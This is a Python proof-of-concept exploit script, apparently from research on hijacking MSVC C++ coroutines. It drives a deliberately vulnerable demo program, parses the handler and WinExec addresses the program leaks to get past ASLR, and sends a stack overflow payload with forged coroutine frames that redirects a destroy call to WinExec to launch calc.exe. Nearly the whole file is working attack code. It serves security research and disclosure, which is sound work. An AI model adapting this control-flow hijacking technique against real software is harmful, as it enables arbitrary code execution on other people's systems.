import subprocess
import time

def xstr(hex_number):
    padded_hex = f"{hex_number:016x}"
    inverted_hex = ''.join(reversed([padded_hex[i:i+2] for i in range(0, 16, 2)]))
    return inverted_hex

proc = subprocess.Popen(
    ".\\msvc_cfop_poc\\x64\\PoC\\msvc_cfop_poc.exe",
    stdout=subprocess.PIPE,
    stdin=subprocess.PIPE,
    stderr=subprocess.PIPE
)

"""
Arbitrary code execution PoC.
This PoC shows how to call an arbitrary function with arbitrary arguments using CFOP.

Expected result of the exploit: the calc.exe program is launched

Details on the exploit:
A stack buffer overflows after exploiting a buffer overflow vulnerability.
This buffer overwrites the coroutine handle and injects multiple counterfeit coroutine frames.
Then, it calls the destination function (WinExec), with a controlled argument (which can always be done for destroy calls).
A information leakeage vulnerability is introduced, as to bypass ASLR.

We recommend reading our paper to fully understand this PoC, and also every other attack possible.
However, here are the detailed steps:
1) The handler gets hijacked; coroutine c1 resumes after the c2() call
2) c1 destroys c2, but instead calls WinExec. RCX is automatically assigned to the coroutine frame (WinExec's argument)
"""

# EXPLOIT PAYLOAD
HANDLE_ADDR = 0x14fe10
P1_FRAME_START = 0x14fe20
P2_FRAME_START = 0x14fe50
C1_REAL_RESUME_PTR = 0x0000000140002890 
C2_REAL_RESUME_PTR = 0x0000000140002b30 
C1_REAL_DESTROY_PTR = 0x0000000140002830 
C2_REAL_DESTROY_PTR = 0x0000000140002ad0 
RESUME_INDEX_0 = 0x0001000000000000
RESUME_INDEX_1 = 0x0001000400000000
WINEXEC_ARG0 = 0x00000000636c6163
WINEXEC_ADDR = 0x7ffd35db8ad0


# Start the application and get the leaked addresses
expected_line = "Handler address: "
while True:
    output = proc.stdout.readline().decode()
    print(output.strip())
    if expected_line in output:
        handler_str = output.split("Handler address: ")[1]
        hex_value = handler_str.strip()
        int_value = int(hex_value, 16)
        HANDLE_ADDR = int_value
        P1_FRAME_START = HANDLE_ADDR + 0x10
        P2_FRAME_START = P1_FRAME_START + 0x30
        P3_FRAME_START = P1_FRAME_START + 0x30
        break

expected_line = "WinExec address: "
while True:
    output = proc.stdout.readline().decode()
    print(output.strip())
    if expected_line in output:
        handler_str = output.split("WinExec address: ")[1]
        hex_value = handler_str.strip()
        int_value = int(hex_value, 16)
        WINEXEC_ADDR = int_value
        break


frame_payload = xstr(C1_REAL_RESUME_PTR) + xstr(0x42424242424242) +\
                xstr(0x0) + xstr(RESUME_INDEX_1) +\
                xstr(P2_FRAME_START) + xstr(0x0) +\
                xstr(WINEXEC_ARG0) + xstr(WINEXEC_ADDR) +\
                xstr(0x0) + xstr(0x0) +\
                xstr(0x0) + xstr(0x0)

hex_payload = 'A'*0x80 + xstr(P1_FRAME_START) + xstr(0x0) + frame_payload
raw_payload = bytes.fromhex(hex_payload)
print("payload: "+str(raw_payload))

# Now we wait for the program to ask for input, where we inject the payload
expected_line = "Welcome to the CFOP PoC"
while True:
    output = proc.stdout.readline().decode()
    print(output.strip())

    if expected_line in output:
        print(f"Process PID: {proc.pid}")
        print("Pausing execution. Attach a debugger if you want and press Enter to continue...")
        input()

        print("Sending payload...")
        
        proc.stdin.write(raw_payload + b"\n")
        proc.stdin.flush()
        
        print("Process resumed")

    time.sleep(0.1)

proc.wait()